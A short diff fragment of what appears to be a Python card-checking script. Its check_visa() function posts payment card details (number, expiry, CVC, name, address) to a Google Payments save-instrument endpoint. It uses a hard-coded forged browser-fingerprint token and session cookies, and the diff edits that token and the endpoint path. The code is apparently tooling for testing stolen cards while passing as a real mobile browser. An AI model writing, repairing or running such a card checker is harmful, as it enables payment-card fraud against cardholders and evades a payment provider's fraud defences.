+        'kt': 'Rs2.0.8:billing_ui_v3::s11,2,26b5e19,1,140,a063ebe9,0,2b6,edd98bac,0,18,4863fd35,1,140,cb2d5c6f,0,2b6,6ad47c6c,1,e8,7bdb49f6,1,95,b6540200,0,140,eea820b6,0,236,1aa4331,0,"Linux armv81,f54683f2,0,"Google Inc.,af794515,1,"5.0 28Linux3b Android 103b K29 AppleWebKit2f537.36 28KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,d81723d1,0,"ar2dAE,5cc3ab5f,0,"Mozilla2f5.0 28Linux3b Android 103b K29 AppleWebKit2f537.36 28KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,24a66df6,0,-b4,"Thu Jan 01 1970 023a003a00 GMT2b0200 282a48424a2a 343142 234831482827 27443133454a29,770c67fc,1,6:a21,3,198504cd24a,10,"cardnumber,"ccmonth,"ccyear,"cvc,"ccname,"COUNTRY,"ORGANIZATION,"RECIPIENT,"ADDRESS_LINE_1,"ADDRESS_LINE_2,"LOCALITY,"POSTAL_CODE,"PHONE_NUMBER,"embedderHostOrigin,"xsrf,"sri,84,28f:a40,"f,198504cd4d9,"n,0,0,"t,198504cc8ff,0,0,0,0,198504cc908,198504cc908,198504cc908,198504cc908,198504cc908,0,198504cc919,198504ccd04,198504ccd3f,198504ccd23,198504cd26a,198504cd26b,198504cd585,198504cd807,198504cd808,198504cd83c:a10:a31,3,"h,1,"p,6d,46,"m,5ff,1411,16b3,1144,219e,923'
     }
 
     try:
@@ -108,7 +108,7 @@ def check_visa():
         
         # إرسال الطلب مع إعدادات متقدمة
         response = session.post(
-            'https://payments.google.com/efe/payments/u/1/instrument_manager_save_page',
+            'https://payments.google.com/efe/payments/u/0/instrument_manager_save_page',
             params=params,
             cookies=cookies,
             data=data,
